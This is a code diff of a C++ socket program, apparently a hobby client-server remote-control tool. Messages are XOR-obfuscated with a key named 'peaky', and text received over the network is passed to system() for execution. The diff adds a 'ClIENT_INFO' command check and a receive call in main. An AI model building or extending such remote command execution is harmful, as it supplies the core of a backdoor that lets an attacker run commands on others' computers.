@@ -123,7 +123,7 @@ int Socks::send_msg() {
 	std::cin >> msg;
 	int msg_len = msg.length();
 
-	for (int i = 0, x = 0; i < msg_len; i++, x++) {
+	for (int i =0,x = 0; i < msg_len; i++, x++) {
 		if (x >= peaky_len) {
 			x = 0;
 		}
@@ -154,7 +154,7 @@ int Socks::receive(int flag) {
 	int peaky_len = peaky.length();
 
 	result = recv(ClientSocket, recvbuf, 4000, 0);
-
+	
 
 	if (result > 0) {
 		//parse actual data from message
@@ -162,16 +162,24 @@ int Socks::receive(int flag) {
 			if (recvbuf[i] > 0)
 				msg = msg + recvbuf[i];
 		}
-
+				
+		//decrypt
 		int msg_len = msg.length();
-		//unencrypt
 		/*for (int i = 0, x = 0; i < msg_len; i++, x++) {
-		if (x >= peaky_len) {
-		x = 0;
-		}
-		//msg[i] = msg[i] ^ peaky[x];
+			if (x >= peaky_len) {
+				x = 0;
+			}
+			//msg[i] = msg[i] ^ peaky[x];
 		}*/
+
+		//check commands
+		if (msg.find("ClIENT_INFO") != -1) {
+			printf("%s", msg.c_str());
+			return 0;
+		}
+
 		printf("Unencrypted message: %s\n", msg.c_str());
+		//execute command is flag is set
 		if (flag == 0) {
 			system(msg.c_str());
 		}
@@ -196,10 +204,11 @@ int main()
 	freeaddrinfo(info_ptr);
 	serv_sock.startlistening();
 	serv_sock.accept_connections();
+	serv_sock.receive(1);
 	serv_sock.send_msg();
 	//
 	//serv_sock.receive(0);
 	int temp = 0;
 	std::cin >> temp;
-	return 0;
+    return 0;
 }
